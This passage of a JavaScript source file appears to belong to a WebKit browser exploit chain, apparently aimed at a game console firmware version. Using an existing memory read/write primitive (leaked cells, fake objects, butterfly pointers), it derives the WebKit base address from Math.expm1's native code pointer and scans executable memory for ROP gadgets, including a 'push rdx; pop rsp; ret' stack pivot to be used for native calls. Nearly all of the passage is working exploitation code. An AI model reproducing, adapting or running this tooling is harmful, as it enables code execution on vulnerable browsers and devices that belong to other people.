        mark("G5-BLOCK", (tag || "G5") + " +0x" + rva.toString(16)
            + " beyond mapped webkit (~+0x" + cap.toString(16) + ") — skip read (OOM on HW)");
        return false;
    }
    return true;
}

function tryLegacyG5(rva, tag) {
    if (!ready || !window.p) {
        mark("G5-SKIP", "need Start + Save bases");
        return;
    }
    const p = window.p;
    const { webkitBase } = basesFromSession(loadEffectiveOff());
    if (!webkitBase) {
        mark("G5-SKIP", "no webkitBase");
        return;
    }
    if (!guardG5Rva(rva, tag)) return;
    mark("G5-TRY", tag + " +0x" + rva.toString(16));
    const hex = gadgetBytesHex(p, webkitBase, rva, 8);
    if (hex.indexOf("??") >= 0)
        mark("G5-READ-FAIL", "+0x" + rva.toString(16) + " unreadable — bad base or unmapped");
    else
        mark("G5-HEX", "+0x" + rva.toString(16) + " " + hex);
    const g5 = checkG5Bytes((a) => read1p(p, a), webkitBase, rva);
    if (g5) {
        mark("GADGET-OK", "G5 " + tag + " +0x" + rva.toString(16) + " " + g5.kind);
        saveScannedPivot(webkitBase, { wk_PUSH_RDX_POP_RSP_RET: rva });
        verifyPivotManual();
    } else {
        mark("GADGET-BAD", "G5 " + tag + " +0x" + rva.toString(16) + " — not rdx→rsp pivot");
    }
}

async function runG5ScanRange(minRva, maxRva, center, label) {
    if (!ready || !window.p || busy) return null;
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("G5-SKIP", "no webkitBase — Save bases first");
        return null;
    }
    const cap = webkitRvaMax(off);
    if (minRva > cap) {
        mark("G5-BLOCK", label + " min +0x" + minRva.toString(16)
            + " beyond module ~+0x" + cap.toString(16));
        return null;
    }
    maxRva = Math.min(maxRva, cap);
    if (minRva >= maxRva) {
        mark("G5-SKIP", label + " empty range");
        return null;
    }
    g5Hunt = {
        center: center,
        minRva: minRva,
        maxRva: maxRva,
        cursor: null,
        cands: [],
        done: false,
    };
    busy = true;
    scanQuiet = true;
    setUi();
    mark("G5-HUNT", label + " +0x" + minRva.toString(16) + "…+0x" + maxRva.toString(16));
    let huntBest = null;
    try {
        let finished = false;
        while (!finished)
            finished = await g5HuntChunk(p, webkitBase);
        if (g5Hunt.cands.length) {
            logG5Cands(g5Hunt.cands);
            const best = pickBestG5Cand(g5Hunt.cands, center);
            if (best) {
                mark("G5-HUNT-BEST", "+0x" + best.rva.toString(16) + " " + best.kind);
                saveScannedPivot(webkitBase, { wk_PUSH_RDX_POP_RSP_RET: best.rva });
                huntBest = best.rva;
            }
        } else {
            mark("G5-HUNT-MISS", label + " — no rdx→rsp pivot");
        }
    } finally {
        scanQuiet = false;
        g5Hunt = null;
        busy = false;
        renderOut();
        setUi();
        if (huntBest != null) verifyPivotManual();
    }
    return huntBest;
}

async function runG5HuntNear() {
    if (g5Hunt && !g5Hunt.done) {
        g5Hunt = null;
        mark("G5-STOP", "hunt cancelled");
        return;
    }
    const cap = scanCapOff();
    await runG5ScanRange(
        Math.max(SCAN_PIVOT_MIN, G5_HUNT_CENTER - G5_HUNT_RADIUS),
        Math.min(cap, G5_HUNT_CENTER + G5_HUNT_RADIUS),
        G5_HUNT_CENTER,
        "low-near-2411b0");
}

async function runG5HuntExpm1() {
    const off = loadEffectiveOff();
    const center = g5Expm1Hint(off) || (HW_GADGETS_1352.wk_expm1_builtin + G5_EXPM1_DELTA);
    if (!g5RvaSafe(center, off)) {
        mark("G5-SKIP", "expm1 hint +0x" + center.toString(16) + " out of module bounds");
        return;
    }
    const cap = webkitRvaMax(off);
    await runG5ScanRange(
        Math.max(SCAN_PIVOT_MIN, center - G5_HUNT_RADIUS),
        Math.min(cap, center + G5_HUNT_RADIUS),
        center,
        "expm1-delta");
}

async function runG5UpperScan() {
    const off = loadEffectiveOff();
    const cap = webkitRvaMax(off);
    const lo = SCAN_LOW_MAX;
    if (lo >= cap) {
        mark("G5-SKIP", "upper range empty — module ends ~+0x" + cap.toString(16)
            + " (13.00 high G5 @ +0x2abccaa is unmapped)");
        return;
    }
    mark("G5-INFO", "scanning +0x" + lo.toString(16) + "…+0x" + cap.toString(16)
        + " (pop rcx @ +0xeaf246 lives here — missed by 8MB cap)");
    await runG5ScanRange(lo, cap, off.wk_POP_RCX_RET || 0xeaf246, "upper-low");
}

async function probeWebkitBound() {
    if (!ready || !window.p || busy) return;
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("MOD-SKIP", "no webkitBase");
        return;
    }
    const floor = Math.max(0x100000, webkitRvaMaxFromOff(off) - 0x180000);
    let lastOk = floor;
    mark("MOD-PROBE", "stepping +64K from +0x" + floor.toString(16) + "…");
    busy = true;
    setUi();
    try {
        for (let rva = floor; rva < 0x3500000; rva += 0x10000) {
            const b = read1p(p, webkitBase.add32(rva));
            if (b == null) {
                saveWebkitRvaProbe(lastOk);
                mark("MOD-BOUND", "max readable ~+0x" + lastOk.toString(16)
                    + " (+0x" + rva.toString(16) + " unreadable — no high G5 reads)");
                return;
            }
            lastOk = rva;
            if ((rva & 0xfffff) === 0)
                mark("MOD-PROBE", "+0x" + rva.toString(16) + " ok");
            await new Promise(r => setTimeout(r, 0));
        }
        saveWebkitRvaProbe(lastOk);
        mark("MOD-BOUND", "probe cap +0x" + lastOk.toString(16));
    } finally {
        busy = false;
        setUi();
    }
}

async function runG5FullHunt() {
    scanG5Full = true;
    await runG5ScanRange(SCAN_PIVOT_MIN, SCAN_LOW_MAX, G5_HUNT_CENTER, "low-full");
    if (loadScannedPivot() && loadScannedPivot().wk_PUSH_RDX_POP_RSP_RET != null) return;
    await runG5HuntExpm1();
    if (loadScannedPivot() && loadScannedPivot().wk_PUSH_RDX_POP_RSP_RET != null) return;
    await runG5UpperScan();
    if (loadScannedPivot() && loadScannedPivot().wk_PUSH_RDX_POP_RSP_RET != null) return;
    for (let i = 0; i < G5_LEGACY_RVAS.length; i++)
        tryLegacyG5(G5_LEGACY_RVAS[i][0], G5_LEGACY_RVAS[i][1]);
}

async function g5HuntChunk(p, webkitBase) {
    if (!g5Hunt) return true;
    let rva = g5Hunt.cursor != null ? g5Hunt.cursor : (g5Hunt.minRva & ~7);
    let steps = 0;
    while (rva < g5Hunt.maxRva && steps < SCAN_CHUNK_STEPS) {
        scanG5PatternsAt(p, webkitBase, rva, g5Hunt.cands, g5Hunt.center);
        rva += 8;
        steps++;
        if (SCAN_YIELD_EVERY > 0 && (steps & (SCAN_YIELD_EVERY - 1)) === 0)
            await new Promise(r => setTimeout(r, 0));
    }
    g5Hunt.cursor = rva;
    scanState("G5 hunt @+0x" + rva.toString(16) + " hits=" + g5Hunt.cands.length);
    return rva >= g5Hunt.maxRva;
}

function peekG5Rva(rva) {
    if (!ready || !window.p) {
        mark("G5-SKIP", "need Start + Save bases first");
        return;
    }
    const off = loadEffectiveOff();
    if (!guardG5Rva(rva, "peek")) return;
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("G5-SKIP", "no webkitBase");
        return;
    }
    const addr = webkitBase.add32(rva);
    if (addrIn) addrIn.value = String(addr).replace(/^0x/i, "");
    peekAt(addr);
}

function wireG5Bar() {
    const host = $("gadget-g5");
    if (!host) return;
    const g0 = PIVOT_HW_1352.wk_MOV_RDI_RSI_30_CALL;

    function addBtn(label, fn, alwaysOn) {
        const b = document.createElement("button");
        b.type = "button";
        b.className = "secondary";
        b.textContent = label;
        b.disabled = !alwaysOn;
        wireClick(b, fn);
        host.appendChild(b);
        if (!alwaysOn) g5BarBtns.push(b);
        return b;
    }

    addBtn("G5 hunt low", function () { runG5HuntNear(); });
    addBtn("G5 hunt expm1", function () { runG5HuntExpm1(); });
    addBtn("G5 scan upper", function () { runG5UpperScan(); });
    addBtn("G5 all-in", function () { runG5FullHunt(); });
    addBtn("Probe bound", function () { probeWebkitBound(); });
    addBtn("Try G5 13.00", function () { tryLegacyG5(0x2abccaa, "13.00"); });
    addBtn("G5 probe", function () {
        scanG5Full = true;
        runG5ClusterProbe();
    });

    const clearHost = host;
    const clearBtn = document.createElement("button");
    clearBtn.type = "button";
    clearBtn.className = "secondary";
    clearBtn.id = "btn-clear-pivot";
    clearBtn.textContent = "Clear pivot";
    clearBtn.disabled = false;
    wireClick(clearBtn, function () { clearPivotState(); });
    clearHost.appendChild(clearBtn);

    const restoreBtn = document.createElement("button");
    restoreBtn.type = "button";
    restoreBtn.className = "secondary";
    restoreBtn.id = "btn-restore-pivot";
    restoreBtn.textContent = "Restore HW pivot";
    restoreBtn.disabled = false;
    wireClick(restoreBtn, function () { restoreHwPivot(); });
    clearHost.appendChild(restoreBtn);

    const hint = host.querySelector(".bar-label");
    if (hint)
        hint.textContent = "G5 HW +0x13ec77a (expm1+0x53642a) — Verify pivot then Native call";
}

function wireGadgetBars() {
    const groups = { base: $("gadget-base"), pop: $("gadget-pop"), pivot: $("gadget-pivot") };
    for (let i = 0; i < MANUAL_TESTS.length; i++) {
        const t = MANUAL_TESTS[i];
        const host = groups[t.group];
        if (!host) continue;
        const b = document.createElement("button");
        b.type = "button";
        b.className = "secondary";
        b.textContent = t.label;
        b.disabled = true;
        const id = t.id;
        wireClick(b, function () { runManualTest(id); });
        host.appendChild(b);
        gadgetBtns.push(b);
    }
}

function read8p(p, addr) {
    if (!addr) return null;
    try { return p.read8(addr); } catch (_) { return null; }
}

function read4p(p, addr) {
    if (!addr) return null;
    try { return p.read4(addr); } catch (_) { return null; }
}

function same64(a, b) {
    return a && b && a.low === b.low && a.hi === b.hi;
}

function addPtr(label, addr, note) {
    if (!addr) return;
    const row = { label, addr: String(addr), note: note || "" };
    pointers.push(row);
    mark("ADDR", row.label + "  " + row.addr + (row.note ? "  (" + row.note + ")" : ""));
}

function walkCell(p, label, obj) {
    retained.push(obj);
    const cell = p.leakval(obj);
    addPtr(label + " cell", cell, "leakval");
    const hdr = read8p(p, cell);
    if (hdr) mark("HDR", label + " header=" + hdr);
    for (const [off, tag] of [[0x8, "butterfly"], [0x10, "+0x10"], [0x18, "+0x18"]]) {
        const q = read8p(p, cell.add32(off));
        if (q && q.low !== 0) addPtr(label + " " + tag, q, "cell+0x" + off.toString(16));
    }
    return cell;
}

function captureNativeChain(p, mFunctionOff, off) {
    const cell = walkCell(p, "Math.expm1", Math.expm1);
    const mid = read8p(p, cell.add32(0x18));
    if (!mid) return null;
    addPtr("JSFunction (expm1)", mid, "cell+0x18");
    const nativeFn = read8p(p, mid.add32(mFunctionOff));
    if (nativeFn) {
        addPtr("native code ptr", nativeFn, "m_function / webkit .text");
        try { sessionStorage.setItem("wk-nativeFn", String(nativeFn)); } catch (_) { }
        const q0 = read4p(p, nativeFn);
        if (q0 != null) mark("CODE", "nativeFn first4=0x" + (q0 >>> 0).toString(16));
        if (off && off.wk_expm1_builtin) {
            const n = (nativeFn.hi * 0x100000000 + (nativeFn.low >>> 0))
                - (off.wk_expm1_builtin >>> 0);
            const webkitBase = new int64(n >>> 0, Math.floor(n / 0x100000000));
            addPtr("webkitBase (assumed)", webkitBase,
                "nativeFn - 0x" + off.wk_expm1_builtin.toString(16));
            try { sessionStorage.setItem("wk-webkitBase", String(webkitBase)); } catch (_) { }
        }
    }
    return nativeFn;
}

function addPairStatusPtrs() {
    const ps = pairStatus;
    const fields = [
        ["mainAddress", "carrier mainView"],
        ["mainVector", "main vector"],
        ["mainCellFromFakeSlot", "main from fake slot"],
        ["workerAddress", "carrier workerView"],
        ["workerVector", "worker vector"],
        ["workerButterfly", "worker butterfly"],
        ["fakeAddress", "fake cell"],
        ["fakeButterfly", "fake butterfly"],
    ];
    for (const [key, label] of fields) {
        const v = ps[key];
        if (v != null && v !== -1) addPtr(label, v, "pair/exploit");
    }
    mark("PAIR", "state=" + ps.state + " promoted=" + ps.promoted
        + " vectorOff=0x" + (ps.vectorOffset >>> 0).toString(16));
}

function renderMap() {
    if (!mapBody) return;
    if (pointers.length === 0) {
        mapBody.innerHTML = "<tr><td colspan=\"3\">no pointers</td></tr>";
        return;
    }
    mapBody.innerHTML = pointers.map((row, i) =>
        "<tr><td>" + row.label + "</td>"
        + "<td class=\"addr\" data-i=\"" + i + "\">" + row.addr + "</td>"
        + "<td>" + row.note + "</td></tr>"
    ).join("");
    mapBody.querySelectorAll(".addr").forEach(el => {
        el.addEventListener("click", () => {
            const row = pointers[+el.getAttribute("data-i")];
            if (row && addrIn) addrIn.value = row.addr.replace(/^0x/i, "");
            peekAt(parseAddr(row.addr.replace(/^0x/i, "")));
        });
    });

    if (pickPtr) {
        const cur = pickPtr.value;
        pickPtr.innerHTML = "<option value=\"\">pick known ptr…</option>"
            + pointers.map((row, i) =>
                "<option value=\"" + i + "\">" + row.label + " " + row.addr + "</option>"
            ).join("");
        if (cur) pickPtr.value = cur;
    }
}

function hexLine(addr, bytes) {
    const a = addr.low.toString(16).padStart(8, "0");
    const h = [...bytes].map(b => b.toString(16).padStart(2, "0")).join(" ");
    return a + "  " + h;
}

function read1p(p, addr) {
    try { return p.read1(addr); } catch (_) { return null; }
}

function peekAt(addr) {
    const p = window.p;
    if (!p || !addr) {
        if (hexEl) hexEl.textContent = "bad address";
        return;
    }
    const out = [];
    let cur = addr;
    for (let row = 0; row < 8; row++) {
        const chunk = [];
        for (let i = 0; i < 8; i++) {
            const b = read1p(p, cur.add32(i));
            if (b == null) {
                if (hexEl) hexEl.textContent = out.join("\n") + "\n(read failed @ " + cur + ")";
                return;
            }
            chunk.push(b & 0xff);
        }
        out.push(hexLine(cur, chunk));
        cur = cur.add32(8);
    }
    if (hexEl) hexEl.textContent = out.join("\n");
    mark("PEEK", String(addr));
}

function loadEffectiveOff() {
    const detected = offsetsFor(navigator.userAgent);
    const key = detected.key || "13.52";
    let off = Object.assign({}, offsetsForKey(key).off || {});
    try {
        const cal = sessionStorage.getItem("wk-calibrated");
        if (cal) off = Object.assign(off, JSON.parse(cal));
    } catch (_) { }
    off = Object.assign(off, HW_GADGETS_1352, PIVOT_HW_1352);
    const scanned = loadScannedPivot();
    if (scanned) off = mergeScannedPivot(off, scanned);
    if (off.pivot_view_sp == null)
        off.pivot_view_sp = PIVOT_HINTS_1300.pivot_view_sp;
    return off;
}

function pivotClusterRange(found) {
    const cap = scanCapOff();
    const known = [];
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        const k = PIVOT_ROWS[i][1];
        const r = (found && found[k] != null) ? found[k] : PIVOT_HW_1352[k];
        if (r != null) known.push(r);
    }
    if (!known.length) return null;
    let lo = known[0];
    let hi = known[0];
    for (let i = 1; i < known.length; i++) {
        if (known[i] < lo) lo = known[i];
        if (known[i] > hi) hi = known[i];
    }
    return {
        minRva: Math.max(SCAN_PIVOT_MIN, lo - SCAN_CLUSTER_PAD),
        maxRva: Math.min(cap, hi + SCAN_CLUSTER_PAD),
    };
}

function pivotScanRange(key, phase, found) {
    const off = loadEffectiveOff();
    const cap = webkitRvaMax(off);
    if (phase === "upper") {
        const lo = SCAN_LOW_MAX;
        if (lo >= cap) return null;
        return { minRva: lo, maxRva: cap };
    }
    if (phase === "nearg5") {
        const center = G5_HUNT_CENTER || pivotScanHint(key, found, cap, off);
        if (center <= 0 || center >= cap) return null;
        return {
            minRva: Math.max(SCAN_PIVOT_MIN, center - G5_HUNT_RADIUS),
            maxRva: Math.min(cap, center + G5_HUNT_RADIUS),
        };
    }
    if (phase === "cluster") {
        return pivotClusterRange(found);
    }
    if (phase === "low") {
        return { minRva: SCAN_PIVOT_MIN, maxRva: Math.min(SCAN_LOW_MAX, cap) };
    }
    const hint = pivotHint(key);
    if (hint <= 0 || hint >= cap) return null;
    return {
        minRva: Math.max(SCAN_PIVOT_MIN, hint - SCAN_NEAR_RADIUS),
        maxRva: Math.min(cap, hint + SCAN_NEAR_RADIUS),
    };
}

function pivotScanPatterns(label, pat) {
    if (label === "G5") return G5_PATTERNS.map(g => g.pat);
    return [pat];
}

function pivotStartPhase(label) {
    return label === "G5" ? "nearg5" : "low";
}

function pivotScanFoundInit() {
    const found = Object.assign({}, PIVOT_HW_1352);
    const saved = loadScannedPivot();
    if (saved) Object.assign(found, saved);
    return found;
}

function bytesFromRead8Into(w, out, at) {
    at = at || 0;
    let v = w.low >>> 0;
    for (let i = 0; i < 4; i++) {
        out[at + i] = v & 0xff;
        v >>>= 8;
    }
    v = w.hi >>> 0;
    for (let i = 4; i < 8; i++) {
        out[at + i] = v & 0xff;
        v >>>= 8;
    }
}

function fillWindow16(p, base, rva, buf) {
    const w0 = read8p(p, base.add32(rva));
    if (!w0) return false;
    bytesFromRead8Into(w0, buf, 0);
    const w1 = read8p(p, base.add32(rva + 8));
    if (w1) bytesFromRead8Into(w1, buf, 8);
    else for (let i = 8; i < 16; i++) buf[i] = 0;
    return true;
}

function bytesFromRead8(w) {
    bytesFromRead8Into(w, _scanBytes);
    return _scanBytes;
}

function matchPatAt(bytes, startOff, pat) {
    for (let i = 0; i < pat.length; i++) {
        if (pat[i] === null) continue;
        if ((bytes[startOff + i] & 0xff) !== pat[i]) return false;
    }
    return true;
}

function findPatInQword(bytes, pat) {
    const maxStart = 8 - pat.length;
    for (let start = 0; start <= maxStart; start++) {
        if (matchPatAt(bytes, start, pat)) return start;
    }
    return -1;
}

function scanState(msg) {
    if (stateEl) {
        stateEl.textContent = msg;
        stateEl.className = "warn";
    }
}

function g5CandPush(cands, entry, hint) {
    if (cands.length < SCAN_G5_CAND_MAX) {
        cands.push(entry);
        return;
    }
    let worst = 0;
    let worstDist = hint > 0
        ? Math.abs(cands[0].rva - hint)
        : -cands[0].rva;
    for (let i = 1; i < cands.length; i++) {
        const d = hint > 0
            ? Math.abs(cands[i].rva - hint)
            : -cands[i].rva;
        if (d > worstDist) {
            worst = i;
            worstDist = d;
        }
    }
    const nd = hint > 0
        ? Math.abs(entry.rva - hint)
        : -entry.rva;
    if (nd < worstDist) cands[worst] = entry;
}

function logG5Cands(cands) {
    if (!cands.length) return;
    const sorted = cands.slice().sort((a, b) => a.rva - b.rva);
    const show = Math.min(sorted.length, 8);
    for (let i = 0; i < show; i++)
        mark("G5-CAND", "+0x" + sorted[i].rva.toString(16)
            + (sorted[i].kind ? " " + sorted[i].kind : ""));
    if (sorted.length > show)
        mark("G5-CAND", "… +" + (sorted.length - show) + " more");
}

function pivotRowDone(found, key) {
    return found[key] != null || PIVOT_HW_1352[key] != null;
}

function advancePivotRowIdx(pivotScan) {
    while (pivotScan.rowIdx < PIVOT_ROWS.length) {
        const key = PIVOT_ROWS[pivotScan.rowIdx][1];
        if (!pivotRowDone(pivotScan.found, key)) return false;
        pivotScan.rowIdx++;
        pivotScan.cursor = null;
        pivotScan.phase = pivotStartPhase(PIVOT_ROWS[pivotScan.rowIdx]
            ? PIVOT_ROWS[pivotScan.rowIdx][0] : "G0");
    }
    return true;
}

function loadPivotScanState(base) {
    try {
        const raw = sessionStorage.getItem("wk-pivot-scan-state");
        if (!raw) return null;
        const st = JSON.parse(raw);
        if (!st || String(st.base) !== String(base)) return null;
        return st;
    } catch (_) {
        return null;
    }
}

function preparePivotScan(webkitBase) {
    const found = pivotScanFoundInit();
    let rowIdx = 0;
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        const key = PIVOT_ROWS[i][1];
        if (found[key] == null && PIVOT_HW_1352[key] == null) {
            rowIdx = i;
            break;
        }
        if (i === PIVOT_ROWS.length - 1) rowIdx = PIVOT_ROWS.length;
    }
    const prev = loadPivotScanState(webkitBase);
    const rowLabel = rowIdx < PIVOT_ROWS.length ? PIVOT_ROWS[rowIdx][0] : "";
    const startPhase = pivotStartPhase(rowLabel);
    pivotScan = {
        base: String(webkitBase),
        rowIdx,
        cursor: (prev && prev.rowIdx === rowIdx && prev.phase === startPhase) ? prev.cursor : null,
        phase: (prev && prev.rowIdx === rowIdx) ? (prev.phase || startPhase) : startPhase,
        found,
        bestHit: (prev && prev.rowIdx === rowIdx) ? (prev.bestHit || null) : null,
        g5Cands: (prev && prev.rowIdx === rowIdx && prev.g5Cands) ? prev.g5Cands : [],
    };
    if (rowIdx < PIVOT_ROWS.length) {
        mark("SCAN-START", "scanning " + PIVOT_ROWS[rowIdx][0]
            + " (" + (rowIdx + 1) + "/" + PIVOT_ROWS.length + ")");
    }
    savePivotScanState(pivotScan);
}

function savePivotScanState(st) {
    if (!st) return;
    try {
        sessionStorage.setItem("wk-pivot-scan-state", JSON.stringify({
            base: st.base,
            rowIdx: st.rowIdx,
            cursor: st.cursor,
            phase: st.phase,
            found: st.found,
            bestHit: st.bestHit || null,
            g5Cands: st.g5Cands || [],
        }));
    } catch (_) { }
}

/** One bounded chunk per call — cal scanGadgetChunk style. */
async function scanPivotRowPhase(p, webkitBase, off) {
    if (!pivotScan || String(pivotScan.base) !== String(webkitBase))
        preparePivotScan(webkitBase);
    pivotScan.found = Object.assign(pivotScanFoundInit(), pivotScan.found);
    if (pivotScan.bestHit == null) pivotScan.bestHit = null;
    if (!pivotScan.g5Cands) pivotScan.g5Cands = [];

    if (pivotScan.rowIdx >= PIVOT_ROWS.length || advancePivotRowIdx(pivotScan)) {
        mark("SCAN-DONE", "all pivot rows processed");
        savePivotScanState(pivotScan);
        return "done";
    }

    const row = PIVOT_ROWS[pivotScan.rowIdx];
    const key = row[1];
    const label = row[0];
    const pat = pivotPattern(row, off);
    const pats = pivotScanPatterns(label, pat);
    const patKinds = label === "G5" ? G5_PATTERNS.map(g => g.kind) : null;
    if (!pivotScan.phase) pivotScan.phase = pivotStartPhase(label);
    const range = pivotScanRange(key, pivotScan.phase, pivotScan.found);
    if (!range) {
        if (label === "G5" && pivotScan.phase === "cluster") {
            mark("G5-PHASE", "no cluster — use G5 bar or full scan");
            pivotScan.rowIdx++;
            pivotScan.cursor = null;
            pivotScan.phase = "cluster";
            pivotScan.bestHit = null;
            pivotScan.g5Cands = [];
            savePivotScanState(pivotScan);
            return "continue";
        }
        if (pivotScan.phase === "cluster") {
            pivotScan.phase = "low";
            pivotScan.cursor = null;
            pivotScan.bestHit = null;
            savePivotScanState(pivotScan);
            mark("SCAN-PHASE", label + " — cluster skip, low .text");
            return "continue";
        }
        mark("SCAN-MISS", label + " — no scan range");
        pivotScan.rowIdx++;
        pivotScan.cursor = null;
        pivotScan.phase = pivotStartPhase(
            PIVOT_ROWS[pivotScan.rowIdx] ? PIVOT_ROWS[pivotScan.rowIdx][0] : "G0");
        pivotScan.bestHit = null;
        pivotScan.g5Cands = [];
        savePivotScanState(pivotScan);
        return "continue";
    }

    let rva = pivotScan.cursor != null ? pivotScan.cursor : (range.minRva & ~7);
    let steps = 0;
    const hint = pivotScanHint(key, pivotScan.found, scanCapOff(), loadEffectiveOff());
    const chunkMax = SCAN_CHUNK_STEPS > 0 ? SCAN_CHUNK_STEPS : 2048;

    while (rva < range.maxRva && !scanPivotStop && steps < chunkMax) {
        if (label === "G5") {
            scanG5PatternsAt(p, webkitBase, rva, pivotScan.g5Cands, hint || G5_HUNT_CENTER);
            const best = pickBestG5Cand(pivotScan.g5Cands, hint || G5_HUNT_CENTER);
            if (best) pivotScan.bestHit = best;
        } else {
            const w = read8p(p, webkitBase.add32(rva));
            if (w) {
                const bytes = bytesFromRead8(w);
                for (let pi = 0; pi < pats.length; pi++) {
                    const offIn = findPatInQword(bytes, pats[pi]);
                    if (offIn < 0) continue;
                    const cand = rva + offIn;
                    if (pivotScan.bestHit == null)
                        pivotScan.bestHit = { rva: cand };
                    else if (hint > 0
                        && Math.abs(cand - hint) < Math.abs(pivotScan.bestHit.rva - hint))
                        pivotScan.bestHit = { rva: cand };
                }
            }
        }
        rva += 8;
        steps++;
        if (SCAN_YIELD_EVERY > 0 && (steps & (SCAN_YIELD_EVERY - 1)) === 0)
            await new Promise(r => setTimeout(r, 0));
    }

    pivotScan.cursor = rva;
    scanState("scan " + label + " " + pivotScan.phase + " @+0x" + rva.toString(16));

    if (scanPivotStop) {
        savePivotScanState(pivotScan);
        return "stopped";
    }

    if (rva < range.maxRva) {
        savePivotScanState(pivotScan);
        return "continue";
    }

    const hit = pivotScan.bestHit;
    pivotScan.cursor = null;
    savePivotScanState(pivotScan);

    if (hit != null) {
        pivotScan.found[key] = hit.rva;
        saveScannedPivot(webkitBase, pivotScan.found);
        if (label === "G5") {
            logG5Cands(pivotScan.g5Cands);
            mark("SCAN-HIT", "G5 +0x" + hit.rva.toString(16)
                + (hit.kind ? " " + hit.kind : "")
                + " phase=" + pivotScan.phase);
        } else {
            mark("SCAN-HIT", label + " +0x" + hit.rva.toString(16)
                + " phase=" + pivotScan.phase
                + (hint ? " hint=+0x" + hint.toString(16) : ""));
        }
        pivotScan.rowIdx++;
        pivotScan.phase = pivotStartPhase(
            PIVOT_ROWS[pivotScan.rowIdx] ? PIVOT_ROWS[pivotScan.rowIdx][0] : "G0");
        pivotScan.bestHit = null;
        pivotScan.g5Cands = [];
        savePivotScanState(pivotScan);
        updatePivotReady(p, loadEffectiveOff());
        return "continue";
    }

    if (label === "G5" && pivotScan.phase === "nearg5") {
        pivotScan.phase = "cluster";
        pivotScan.cursor = null;
        pivotScan.bestHit = null;
        savePivotScanState(pivotScan);
        mark("G5-PHASE", "near-G0 (+0x2411ac) miss — trying G0-G4 cluster");
        return "continue";
    }

    if (label === "G5" && pivotScan.phase === "cluster") {
        pivotScan.phase = "low";
        pivotScan.cursor = null;
        pivotScan.bestHit = null;
        savePivotScanState(pivotScan);
        mark("G5-PHASE", "cluster miss — low .text (16-byte scan)");
        return "continue";
    }

    if (label === "G5" && pivotScan.phase === "low") {
        pivotScan.phase = "upper";
        pivotScan.cursor = null;
        pivotScan.bestHit = null;
        pivotScan.g5Cands = [];
        savePivotScanState(pivotScan);
        const cap = scanCapOff();
        mark("G5-PHASE", "low miss — upper .text +0x" + SCAN_LOW_MAX.toString(16)
            + "…+0x" + cap.toString(16) + " (13.00 high G5 unmapped)");
        return "continue";
    }

    if (label === "G5" && pivotScan.phase === "upper") {
        logG5Cands(pivotScan.g5Cands);
        mark("SCAN-MISS", "G5 not found — try G5 hunt expm1 or G5 all-in");
        pivotScan.rowIdx++;
        pivotScan.phase = "nearg5";
        pivotScan.bestHit = null;
        pivotScan.g5Cands = [];
        savePivotScanState(pivotScan);
        return "continue";
    }

    if (pivotScan.phase === "cluster") {
        pivotScan.phase = "low";
        pivotScan.cursor = null;
        pivotScan.bestHit = null;
        savePivotScanState(pivotScan);
        mark("SCAN-PHASE", label + " cluster miss — low .text");
        return "continue";
    }

    mark("SCAN-MISS", label + " not found — paste RVA if you find on HW");
    pivotScan.rowIdx++;
    pivotScan.phase = pivotStartPhase(
        PIVOT_ROWS[pivotScan.rowIdx] ? PIVOT_ROWS[pivotScan.rowIdx][0] : "G0");
    pivotScan.bestHit = null;
    pivotScan.g5Cands = [];
    savePivotScanState(pivotScan);
    return "continue";
}

function stopPivotScanQuiet() {
    scanPivotStop = true;
    scanPivotAuto = false;
}

function runG5ClusterProbe() {
    if (!ready || !window.p || busy) return;
    if (scanPivotAuto) {
        scanPivotStop = true;
        mark("SCAN-STOP", "stopping…");
        return;
    }
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("G5-SKIP", "no webkitBase");
        return;
    }
    preparePivotScan(webkitBase);
    for (let i = 0; i < PIVOT_ROWS.length; i++) {
        if (PIVOT_ROWS[i][0] === "G5") {
            pivotScan.rowIdx = i;
            break;
        }
    }
    pivotScan.phase = "nearg5";
    pivotScan.cursor = null;
    pivotScan.bestHit = null;
    pivotScan.g5Cands = [];
    savePivotScanState(pivotScan);
    mark("G5-PROBE", "near-G0 @+0x2411ac (G0+0x15d362, chunked)");
    runPivotScanLoop(true);
}

async function runPivotScanLoop(g5Only) {
    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) return;

    scanPivotAuto = true;
    scanPivotStop = false;
    scanQuiet = true;
    busy = true;
    setUi();

    try {
        while (scanPivotAuto && !scanPivotStop) {
            const st = await scanPivotRowPhase(p, webkitBase, off);
            if (st === "stopped") break;
            if (g5Only) {
                if (pivotScan.found.wk_PUSH_RDX_POP_RSP_RET != null) break;
                if (pivotScan.rowIdx > 6) break;
            } else if (st === "done") {
                break;
            }
        }
        if (scanPivotStop)
            mark("SCAN-STOP", "cancelled");
        else if (!g5Only)
            verifyPivotManual();
        else if (pivotScan.found.wk_PUSH_RDX_POP_RSP_RET != null)
            mark("G5-PICK", "+0x" + pivotScan.found.wk_PUSH_RDX_POP_RSP_RET.toString(16)
                + " — tap Verify pivot");
    } catch (err) {
        mark("SCAN-FAIL", err.message || String(err));
        state("scan error", "bad");
    } finally {
        scanQuiet = false;
        scanRenderPending = 0;
        scanPivotAuto = false;
        scanPivotStop = false;
        busy = false;
        renderOut();
        setUi();
    }
}

async function runPivotScanAuto() {
    if (!ready || !window.p) return;
    if (scanPivotAuto) {
        scanPivotStop = true;
        mark("SCAN-STOP", "stopping after current chunk…");
        return;
    }

    const p = window.p;
    const off = loadEffectiveOff();
    const { webkitBase } = basesFromSession(off);
    if (!webkitBase) {
        mark("SCAN-SKIP", "no webkitBase — Save bases first");
        return;
    }

    preparePivotScan(webkitBase);
    const missing = PIVOT_ROWS.filter(r =>
        pivotScan.found[r[1]] == null && PIVOT_HW_1352[r[1]] == null
    ).map(r => r[0]);
    if (missing.length === 0) {
        mark("SCAN-SKIP", "all 7 pivot RVAs set — tap Verify pivot");
        verifyPivotManual();
        return;
    }
    state("scanning " + missing.join(", ") + "…", "warn");
    mark("SCAN-AUTO", "missing: " + missing.join(", ")
        + " — chunked " + SCAN_CHUNK_STEPS + " steps/tick — tap Stop to cancel");

    await runPivotScanLoop(false);
}

async function scanPivotChunk() {
    return runPivotScanAuto();
}

function verifyPivotManual() {
